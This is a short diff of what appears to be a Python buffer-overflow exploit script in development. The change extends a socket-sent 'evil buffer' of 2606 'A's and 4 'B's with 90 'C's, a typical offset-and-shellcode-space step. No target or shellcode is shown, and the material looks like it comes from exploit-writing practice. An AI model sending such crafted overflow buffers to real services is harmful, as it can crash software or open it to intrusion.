@@ -4,7 +4,7 @@ import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 
-buffer = 'A' * 2606 + 'B' * 4 
+buffer = 'A' * 2606 + 'B' * 4 + 'C' * 90
 
 try:
   print "\nSending evil buffer..." 
